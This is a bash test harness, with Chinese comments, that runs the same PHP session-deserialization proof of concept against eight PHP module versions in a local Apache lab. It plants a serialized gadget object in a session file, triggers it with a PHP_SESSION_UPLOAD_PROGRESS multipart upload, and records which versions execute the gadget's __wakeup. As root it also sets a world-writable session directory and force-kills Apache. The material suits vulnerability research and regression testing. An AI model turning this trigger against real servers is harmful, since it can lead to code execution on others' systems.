#!/bin/bash
# 八版本矩阵：同一份代码，只换 PHP 模块
# 用法：MODDIR=/path/to/modules sudo bash matrix_8versions.sh
set -u
MODDIR=${MODDIR:-/opt/php-mods}
DOCROOT=${DOCROOT:-/var/www/lab}
SESSION_DIR=${SESSION_DIR:-$DOCROOT/sess}
SID=${SID:-bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb}
OUT=${OUT:-./matrix_result.txt}

mkdir -p "$DOCROOT" "$SESSION_DIR"; chmod 777 "$SESSION_DIR" 2>/dev/null

cat > "$DOCROOT/preload.php" <<'PHP'
<?php
class DemoGadget { public $a;
  public function __wakeup() { @file_put_contents(__DIR__ . '/proof.txt', "EXEC " . PHP_VERSION . "\n", FILE_APPEND); } }
PHP
chmod 644 "$DOCROOT/preload.php"

{
  printf '%-24s | 是否执行\n' "版本"
  printf -- '-------------------------|---------\n'
} > "$OUT"

run_one() {
  local mod=$1 prefix=$2
  [ -f "$mod" ] || { printf '%-24s | 模块缺失\n' "$(basename "$mod")" >> "$OUT"; return; }
  printf "zend.assertions=-1\nopcache.enable=1\nopcache.preload=$DOCROOT/preload.php\nopcache.preload_user=www-data\n" > "$prefix/lib/php.ini"

  cat > /etc/apache2/mods-available/php-lab.load <<EOF
LoadModule php_module $mod
EOF
  a2dismod php  >/dev/null 2>&1 || true
  a2dismod php7 >/dev/null 2>&1 || true
  pkill -9 -x apache2 2>/dev/null || true; sleep 1
  rm -f /var/run/apache2/apache2.pid "$SESSION_DIR"/sess_*
  : > "$DOCROOT/proof.txt"; chmod 666 "$DOCROOT/proof.txt"
  source /etc/apache2/envvars
  setsid /usr/sbin/apache2 -DFOREGROUND > /tmp/apache-matrix.log 2>&1 &
  sleep 3

  printf 'data|O:12:"DemoGadget":1:{s:1:"a";s:1:"b";}' > "$SESSION_DIR/sess_$SID"
  chmod 666 "$SESSION_DIR/sess_$SID"
  {
    printf -- '------probe\r\nContent-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n'
    printf -- '------probe\r\nContent-Disposition: form-data; name="f"; filename="a.txt"\r\nContent-Type: text/plain\r\n\r\nAB\r\n'
    printf -- '------probe--\r\n'
  } > /tmp/up.bin

  curl -s -m 20 -o /dev/null -b "PHPSESSID=$SID" \
    -H 'Content-Type: multipart/form-data; boundary=----probe' \
    --data-binary @/tmp/up.bin "http://127.0.0.1:8099/index.php"

  local proof; proof=$(head -1 "$DOCROOT/proof.txt" 2>/dev/null)
  printf '%-24s | %s\n' "$(basename "$mod")" "${proof:-未执行}" >> "$OUT"
}

run_one "$MODDIR/libphp-8234.so" /opt/php8234
run_one "$MODDIR/libphp-8235.so" /opt/php8235
run_one "$MODDIR/libphp-8335.so" /opt/php8335
run_one "$MODDIR/libphp-8336.so" /opt/php8336
run_one "$MODDIR/libphp-8426.so" /opt/php8426
run_one "$MODDIR/libphp-8427.so" /opt/php8427
run_one "$MODDIR/libphp-8511.so" /opt/php8511
run_one "$MODDIR/libphp-8512.so" /opt/php8512

cat "$OUT"
